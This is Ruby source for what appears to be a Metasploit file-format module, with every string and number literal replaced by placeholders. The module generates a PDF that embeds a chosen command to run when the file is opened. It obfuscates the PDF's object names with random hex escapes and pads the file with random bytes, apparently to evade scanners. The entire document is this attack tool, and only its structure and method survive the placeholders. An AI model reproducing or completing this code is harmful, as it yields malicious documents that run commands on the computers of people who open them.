require <str> require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: FILEFORMAT def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> , ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ false , <str> , <str> ] ) , OptString . new ( <str> , [ false , <str> , <str> ] ) , OptString . new ( <str> , [ false , <str> , <str> ] ) , ] , self . class ) end def run exec = datastore [ <str> ] pdf = make_pdf ( exec ) print_status ( <str> datastore [ <str> ] <str> ) file_create ( pdf ) end def n_obfu ( str ) result = <str> str . scan ( <str> ) do | c | if rand ( <int> ) == <int> and c . upcase > = <str> and c . upcase < = <str> result << <str> % c . unpack ( <str> ) [ <int> ] else result << c end end result end def random_non_ascii_string ( count ) result = <str> count . times do result << ( rand ( <int> ) + <int> ) . chr end result end def io_def ( id ) <str> % id end def io_ref ( id ) <str> % id end def make_pdf ( exec ) xref = [ ] eol = <str> endobj = <str> << eol pdf = <str> % [ <int> + rand ( <int> ) , <int> + rand ( <int> ) ] << eol pdf << <str> << random_non_ascii_string ( <int> ) << eol xref << pdf . length pdf << io_def ( <int> ) << n_obfu ( <str> ) << io_ref ( <int> ) << n_obfu ( <str> ) << io_ref ( <int> ) << n_obfu ( <str> ) << io_ref ( <int> ) << <str> << endobj xref << pdf . length pdf << io_def ( <int> ) << n_obfu ( <str> ) << endobj xref << pdf . length pdf << io_def ( <int> ) << n_obfu ( <str> ) << io_ref ( <int> ) << n_obfu ( <str> ) << endobj xref << pdf . length pdf << io_def ( <int> ) << n_obfu ( <str> ) << io_ref ( <int> ) << n_obfu ( <str> ) << endobj xref << pdf . length pdf << io_def ( <int> ) << <str> exec <str> + io_ref ( <int> ) + <str> << endobj xref << pdf . length pdf << endobj xrefPosition = pdf . length pdf << <str> << eol pdf << <str> % ( xref . length + <int> ) << eol pdf << <str> << eol xref . each do | index | pdf << <str> % index << eol end pdf << <str> << n_obfu ( <str> % ( xref . length + <int> ) ) << io_ref ( <int> ) << <str> << eol pdf << <str> << eol pdf << xrefPosition . to_s ( ) << eol pdf << <str> << eol end end 
